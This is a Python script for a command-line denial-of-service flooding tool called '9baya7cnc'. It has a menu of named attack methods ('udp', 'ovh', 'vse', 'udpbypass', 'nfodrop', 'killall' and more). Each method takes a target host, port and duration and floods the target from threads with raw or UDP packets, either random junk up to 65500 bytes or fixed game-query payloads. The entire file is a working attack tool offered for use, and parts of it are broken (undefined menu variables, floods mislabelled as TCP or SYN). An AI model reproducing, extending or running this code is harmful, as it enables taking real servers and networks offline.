#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "9baya7"

methods = """
\033[35m   ___  ____   ___  _  _  _  ___  _____ 
  / _ \|  _ \ / _ \| || || |/ _ \(___  )
 ( (_) | |_) ) |_| | \| |/ | |_| | _/ / 
  \__, |  _ (|  _  |\_   _/|  _  |(  _) 
    / /| |_) ) | | |  | |  | | | |/ /   
   /_/ |____/|_| |_|  |_|  |_| |_/_/    
                                      
\033[35m╔════════════════════════╗
\033[35m║ \033[36m---- \033[32mMethods List! \033[36m--- \033[35m╚═════════╗
\033[35m║ 
\033[35m║
\033[35m║ \033[32mlayer4 \033[36m> \033[32mShows Layer 4 Methods!  \033[35m║
\033[35m║ \033[32mlayer7 \033[36m> \033[32mShows Layer 7 Methods!  \033[35m║
\033[35m║                                  ║
\033[35m║                                  ║
\033[35m║                                  ║
\033[35m╚══════════════════════════════════╝
"""




layer4 = """\033[35m

   ___  ____   ___  _  _  _  ___  _____ 
  / _ \|  _ \ / _ \| || || |/ _ \(___  )
 ( (_) | |_) ) |_| | \| |/ | |_| | _/ / 
  \__, |  _ (|  _  |\_   _/|  _  |(  _) 
    / /| |_) ) | | |  | |  | | | |/ /   
   /_/ |____/|_| |_|  |_|  |_| |_/_/    
                                      
                                        _.oo.
                _.u[[/;:,.         .odMMMMMM'             ╔════════════════════════╗
             .o888UU[[[/;:-.  .o@P^    MMM^               ║ ---- Layer4 List! UDP  ║                                         
             oN88888UU[[[/;::-.        dP^                ║ > udprapev2 -ovh-vac  -║                                         
            dNMMNN888UU[[[/;:--.   .o@P^                  ║  tcp-vyking udpbypass  ║
           ,MMMMMMN888UU[[/;::-. o@^                      ╠════════════════════════╝         
           NNMMMNN888UU[[[/~.o@P^          
           888888888UU[[[/o@^-..          
          oI8888UU[[[/o@P^:--..            
       .@^  YUU[[[/o@^;::---..             
     oMP     ^/o@P^;:::---..                       
  .dMMM    .o@^ ^;::---...                  
 dMMMMMMM@^`       `^^^^                    
YMMMUP^                                    
 ^^
"""

banner =  """
\033[35m                             
   ___  ____   ___  _  _  _  ___  _____ 
  / _ \|  _ \ / _ \| || || |/ _ \(___  )
 ( (_) | |_) ) |_| | \| |/ | |_| | _/ / 
  \__, |  _ (|  _  |\_   _/|  _  |(  _) 
    / /| |_) ) | | |  | |  | | | |/ /   
   /_/ |____/|_| |_|  |_|  |_| |_/_/    
                                      
\
"""

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
  global iaid
  global aid
  global tattacks
  global running

  timeout = time.time() + float(timer)
  sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

  iaid += 1
  aid += 1
  tattacks += 1
  running += 1
  while time.time() < timeout and ldap and attack:
    sock.sendto(punch, (host, int(port)))
  running -= 1
  iaid -= 1
  aid -= 1


def stdsender(host, port, timer, payload):
  global atks
  global running

  timeout = time.time() + float(timer)
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  atks += 1
  running += 1
  while time.time() < timeout and attack:
    sock.sendto(payload, (host, int(port)))
    sock.sendto(payload, (host, int(port)))
    sock.sendto(payload, (host, int(port)))
    sock.sendto(payload, (host, int(port)))
    sock.sendto(payload, (host, int(port)))
    sock.sendto(payload, (host, int(port)))
    sock.sendto(payload, (host, int(port)))
    sock.sendto(payload, (host, int(port)))
  atks -= 1
  running -= 1

def main():
  global fsubs
  global tpings
  global pscans
  global liips
  global tattacks
  global uaid
  global running
  global atk
  global ldap
  global said
  global iaid
  global haid
  global aid
  global attack
  global dp

  while True:
    bots = (random.randint(1,2))
    sys.stdout.write("\x1b]2;9baya7cnc.")
    sin = input("\033[32m[\033[35m{}\033[32m@root]\033[36m$ \033[96m".format(nicknm)).lower()
    sinput = sin.split(" ")[0]
    if sinput == "clear":
      os.system ("clear")
      print (banner)
      main()
    if sinput == "cls":
      os.system ("clear")
      print (banner)
      main()
    elif sinput == "?":
      os.system ("clear")
      print (banner)
      main()
    elif sinput == "layer4":
      os.system ("clear")
      print (layer4)
      main()
    elif sinput == "method":
      os.system ("clear")
      print (methods)
      main()
    elif sinput == "methods":
      os.system ("clear")
      print (methods)
      main()
    elif sinput == "private":
      os.system ("clear")
      print (private)
      main()
    elif sinput == "gen3":
      os.system ("clear")
      print (gen3)
      main()
    elif sinput == "raw":
      os.system ("clear")
      print (raw)
      main()
    elif sinput == "":
      main()
    elif sinput == "exit":
      os.system ("clear")
      exit()
    elif sinput == "std":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "dns":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "ovh":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
            sinput, host, timer, port = sin.split(" ")
            socket.gethostbyname(host)
            payload = b"\x00\x02\x00\x2f"
            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
            print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "vse":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
            sinput, host, timer, port = sin.split(" ")
            socket.gethostbyname(host)
            payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
            print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "syn":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
            sinput, host, timer, port = sin.split(" ")
            socket.gethostbyname(host)
            payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
            threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
            print("\033[97mYour Attack Has Been Launched!")
      except ValueError: 
        main()
      except socket.gaierror:
        main()
    elif sinput == "tcp":
      try:
        if running >= 9999:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          pack = 4096
          punch = random._urandom(int(pack))
          threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "homeslap":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          pack = 2048
          punch = random._urandom(int(pack))
          threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "udp":
      try:
        if running >= 99999:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          pack = 1460
          punch = random._urandom(int(pack))
          threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "killallv2":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          pack = 1460
          punch = random._urandom(int(pack))
          threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "killallv3":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          pack = 1460
          punch = random._urandom(int(pack))
          threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "udprape":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          pack = 0
          punch = random._urandom(int(pack))
          threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "udprapev2":
      try:
        if running >= 9999:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          pack = 65500
          punch = random._urandom(int(pack))
          threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "udpbypass":
      try:
        if running >= 9999:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          pack = 65500
          punch = random._urandom(int(pack))
          threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "icmprape":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          pack = 1024
          punch = random._urandom(int(pack))
          threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "udprapev3":
      try:
        if running >= 9999:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          pack = 10000
          punch = random._urandom(int(pack))
          threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "nfodrop":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError: 
        main()
      except socket.gaierror:
        main()
    elif sinput == "ovhnat":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError: 
        main()
      except socket.gaierror:
        main()
    elif sinput == "ovhamp":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "nfocrush":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "greeth":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "telnet":
      try:
        if running >= 99999:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "ovhkill":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "ovhdown":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "ssdp":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "hydrakiller":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "nfonull":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "killall":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x00\x02\x00\x2f"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "ovhslav":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "cpukill":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "tcprape":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "nforape":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "udpraw":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\0\x14\0\x01\x03"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "tcpraw":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "hexraw":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "stdraw":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "vseraw":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "synraw":
      try:
        if running >= 1:
          print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
          main()
        else:
          sinput, host, timer, port = sin.split(" ")
          socket.gethostbyname(host)
          payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
          threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
          print("\033[97mYour Attack Has Been Launched!")
      except ValueError:
        main()
      except socket.gaierror:
        main()
    elif sinput == "stopattacks":
      attack = False
      while not attack:
        if aid == 0:
          attack = True
    elif sinput == "stop":
      attack = False
      while not attack:
        if aid == 0:
          attack = True

    else:
      main()


try:
  clear = "clear"
  os.system(clear)
  print(banner)
  main()
except KeyboardInterrupt:
  exit()

